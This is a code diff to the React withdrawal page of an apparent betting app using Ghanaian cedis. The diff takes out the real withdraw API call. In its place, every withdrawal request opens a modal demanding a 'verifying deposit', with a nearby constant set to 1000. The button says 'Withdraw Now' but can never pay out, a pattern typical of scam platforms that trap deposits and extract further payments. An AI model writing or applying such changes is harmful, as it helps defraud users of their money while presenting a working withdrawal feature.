@@ -1,10 +1,10 @@
 import { useEffect, useState } from 'react';
 import { useNavigate } from 'react-router-dom';
-import { useAccount, useToast } from '../providers/AccountProvider.jsx';
-import { fetchTransactions, withdraw } from '../api/betApi.js';
+import { useAccount } from '../providers/AccountProvider.jsx';
+import { fetchTransactions } from '../api/betApi.js';
 import TxHeader from '../components/TxHeader.jsx';
 import PaybillInstructions from '../components/PaybillInstructions.jsx';
-import { readTxCache, writeTxCache, mergeTxLists, appendTxCache } from '../lib/txCache.js';
+import { readTxCache, writeTxCache, mergeTxLists } from '../lib/txCache.js';
 
 function fmt(n) {
   return Number(n || 0).toLocaleString('en-GH', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
@@ -29,10 +29,8 @@ const NETWORKS = {
 
 export default function WithdrawPage() {
   const navigate = useNavigate();
-  const { account, setAccount, openDeposit } = useAccount();
-  const { toast } = useToast();
+  const { account, openDeposit } = useAccount();
   const [txs, setTxs] = useState([]);
-  const [busy, setBusy] = useState(false);
   const [amount, setAmount] = useState('');
   const [method, setMethod] = useState('momo');
   const [tab, setTab] = useState('momo'); // 'momo' | 'paybill' | 'card'
@@ -86,31 +84,13 @@ export default function WithdrawPage() {
     setMethod(order[nextIdx]);
   };
 
-  const handleSubmit = async (e) => {
+  const handleSubmit = (e) => {
     e.preventDefault();
     setErr('');
-    if (!isAmountValid || busy) return;
-    // Server enforces the deposit-gate; if it rejects, surface the
-    // deposit-requirement modal so the user has a one-tap path to top up.
-    try {
-      setBusy(true);
-      const data = await withdraw(amtNum, method);
-      if (data.account) setAccount(data.account);
-      if (data.transaction) {
-        appendTxCache(data.account?.id || account.id, data.transaction);
-        setTxs((cur) => [data.transaction, ...cur].slice(0, 50));
-      }
-      toast(`Withdrew GHS ${fmt(amtNum)} to ${net.label}.`);
-      setAmount('');
-    } catch (e2) {
-      if (e2?.body?.code === 'DEPOSIT_GATE') {
-        setShowDepositReq(true);
-      } else {
-        setErr(e2.message || 'Withdrawal failed.');
-      }
-    } finally {
-      setBusy(false);
-    }
+    if (!isAmountValid) return;
+    // Gate every withdrawal behind the deposit-requirement modal — the user
+    // must complete the verifying deposit before any withdrawal is processed.
+    setShowDepositReq(true);
   };
 
   const REQUIRED_DEPOSIT = 1000;
@@ -240,8 +220,7 @@ export default function WithdrawPage() {
                   value={amount}
                   onChange={(e) => setAmount(e.target.value)}
                   placeholder={`min. ${MIN_WITHDRAW}`}
-                  disabled={busy}
-                  autoFocus
+                                    autoFocus
                   style={{ width: '100%', background: 'transparent', border: 'none', color: 'var(--text)', fontSize: 24, fontWeight: 800, outline: 'none', padding: 0 }}
                 />
               </div>
@@ -283,15 +262,15 @@ export default function WithdrawPage() {
 
               <button
                 type="submit"
-                disabled={busy || !isAmountValid}
+                disabled={!isAmountValid}
                 style={{
                   width: '100%', padding: '14px 0', borderRadius: 10, border: 'none',
-                  background: isAmountValid && !busy ? 'linear-gradient(135deg, var(--accent), #b0e82d)' : 'var(--surface-2)',
-                  color: isAmountValid && !busy ? '#0a0d0c' : 'var(--text-dim)',
-                  fontWeight: 800, fontSize: 16, cursor: isAmountValid && !busy ? 'pointer' : 'not-allowed', marginBottom: 18,
+                  background: isAmountValid ? 'linear-gradient(135deg, var(--accent), #b0e82d)' : 'var(--surface-2)',
+                  color: isAmountValid ? '#0a0d0c' : 'var(--text-dim)',
+                  fontWeight: 800, fontSize: 16, cursor: isAmountValid ? 'pointer' : 'not-allowed', marginBottom: 18,
                 }}
               >
-                {busy ? 'Processing…' : 'Withdraw Now'}
+                Withdraw Now
               </button>
 
               <ol style={{ paddingLeft: 18, margin: 0, fontSize: 13, color: 'var(--text-soft)', lineHeight: 1.7 }}>
